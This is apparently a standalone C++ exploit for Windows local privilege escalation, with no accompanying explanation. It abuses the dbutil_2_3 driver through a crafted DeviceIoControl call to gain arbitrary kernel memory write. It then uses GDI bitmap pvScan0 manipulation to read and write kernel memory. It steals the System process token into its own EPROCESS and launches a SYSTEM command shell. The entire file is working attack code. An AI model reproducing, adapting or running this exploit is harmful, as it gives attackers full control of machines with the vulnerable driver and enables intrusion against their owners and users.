#include <Windows.h>
#include <iostream>
#include <Psapi.h>
using namespace std;

HBITMAP hWorker = NULL;
HBITMAP hManager = NULL;
DWORD64 ActiveProcessLinksOffset = 0x2f0; // 0x188;
DWORD64 TokenOffset = 0x358; // 0x208;
DWORD64 UniqueProcessIdOffset = 0x2e8; //0x180;

const DWORD64 GetGdiAddress() {
	const DWORD64 Teb = reinterpret_cast<DWORD64>(NtCurrentTeb());
	DWORD64 Peb = *reinterpret_cast<DWORD64*>((PUCHAR)Teb + 0x60);
	DWORD64 Gdi = *reinterpret_cast<DWORD64*>((PUCHAR)Peb + 0xf8);
	return Gdi;
}

DWORD64 GetKernelAddress(HBITMAP hBitmap) {
	DWORD64 cell;
	cell = *reinterpret_cast<DWORD64*>(GetGdiAddress() + LOWORD(hBitmap) * 0x18);
	return cell;
}

VOID WriteKernelAddress(DWORD64 Address, DWORD64 Value) {
	DWORD64 writebuf = Address;
	SetBitmapBits(hManager, sizeof(DWORD64), &writebuf);
	SetBitmapBits(hWorker, sizeof(DWORD64), &Value);
}

VOID ReadKernelAddress(DWORD64 Address, BYTE * Value, DWORD64 len) {
	DWORD64 writebuf = Address;
	SetBitmapBits(hManager, sizeof(DWORD64), &writebuf);
	GetBitmapBits(hWorker, len, Value);
}

// Get base of ntoskrnl.exe
ULONG64 GetNTOsBase()
{
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)& Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

// Get EPROCESS for System process
DWORD64 PsInitialSystemProcess()
{
	// load ntoskrnl.exe
	DWORD64 ntos = (DWORD64)LoadLibrary("ntoskrnl.exe");
	// get address of exported PsInitialSystemProcess variable
	DWORD64 addr = (DWORD64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	DWORD64 res = 0;
	DWORD64 ntOsBase = GetNTOsBase();
	// subtract addr from ntos to get PsInitialSystemProcess offset from base
	if (ntOsBase) {
		ReadKernelAddress(addr - ntos + ntOsBase, (BYTE*)& res, sizeof(DWORD64));
	}
	return res;
}

// Get EPROCESS for current process
DWORD64 PsGetCurrentProcess()
{
	DWORD64 pEPROCESS = PsInitialSystemProcess();// get System EPROCESS

	// walk ActiveProcessLinks until we find our Pid
	LIST_ENTRY ActiveProcessLinks;
	DWORD64 MyLink;

	ReadKernelAddress(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE*)& ActiveProcessLinks, sizeof(LIST_ENTRY));
	
	DWORD64 res = 0;

	while (TRUE) {
		DWORD64 UniqueProcessId = 0;

		// adjust EPROCESS pointer for next entry
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64);
		
		// get pid
		ReadKernelAddress(pEPROCESS + UniqueProcessIdOffset, (BYTE*)& UniqueProcessId, sizeof(DWORD64));

		// is this our pid?
		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}
		// get next entry
		ReadKernelAddress(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE*)& ActiveProcessLinks, sizeof(LIST_ENTRY));

		// if next same as last, we reached the end
		if (pEPROCESS == (DWORD64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64))
			break;
	}
	return res;
}

VOID Trigger() {
	BYTE buf[0x64 * 0x64 * 4];
	hManager = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	hWorker = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	if (hManager == NULL || hWorker == NULL) {
		cout << "[-] CreateBitmap Failed.\n";
		exit(-1);
	}

	DWORD64 hManagerKernelAddress = GetKernelAddress(hManager);
	DWORD64 hWorkerKernelAddress = GetKernelAddress(hWorker);
	cout << "[+] Manager Kernel Address : 0x" << hex << hManagerKernelAddress << endl;
	cout << "[+] Worker Kernel Address : 0x" << hex << hWorkerKernelAddress << endl << endl;

	DWORD64 hManagerPvScan0 = hManagerKernelAddress + 0x50;
	DWORD64 hWorkerPvScan0 = hWorkerKernelAddress + 0x50;
	cout << "[+] Worker PvScan0 Address : 0x" << hex << hWorkerPvScan0 << endl;
	cout << "[+] Manager PvScan0 Address : 0x" << hex << hManagerPvScan0 << endl << endl;;

	cout << "[+] Writing Worker PvScan0 Address to Manager PvScan0 Address.\n";

	BYTE payload[0x28] = { 0x0 };
	memcpy((payload + 0x18), (void*)& hWorkerPvScan0, sizeof(DWORD64));
	memcpy((payload + 0x8), (void*)& hManagerPvScan0, sizeof(DWORD64));
	memset(payload + 0x20, 0x8, 1);

	BYTE out[0x28] = { 0 };
	DWORD returnedBytes = 0x0;

	HANDLE hFile = CreateFileA("\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[-] CreateFile Failed.\n";
		exit(-1);
	}

	cout << "[+] Opened handle to device with value 0x" << hex << hFile << endl;
	getchar();

	auto Ok = DeviceIoControl(hFile, 0x9B0C1EC8, (LPVOID)& payload, 0x28, &out, 0x28, &returnedBytes, NULL);
	if (!Ok) {
		cout << "[-] DeviceIoControl Failed.\n";
		exit(-1);
	}

	cout << "[+] Successfully written Worker PvScan0 Address to Manager PvScan0 Address.\n\n";
}

int main(int argc, char* argv[]) {
	Trigger();

	ULONG64 SystemEPROCESS = PsInitialSystemProcess();
	
	ULONG64 CurrentEPROCESS = PsGetCurrentProcess();
	
	ULONG64 SystemToken = 0;
	// read token from system process
	ReadKernelAddress(SystemEPROCESS + TokenOffset, (BYTE*)& SystemToken, sizeof(DWORD64));

	// write token to current process
	WriteKernelAddress(CurrentEPROCESS + TokenOffset, (DWORD64)SystemToken);
	system("cmd.exe");

	return 0;
}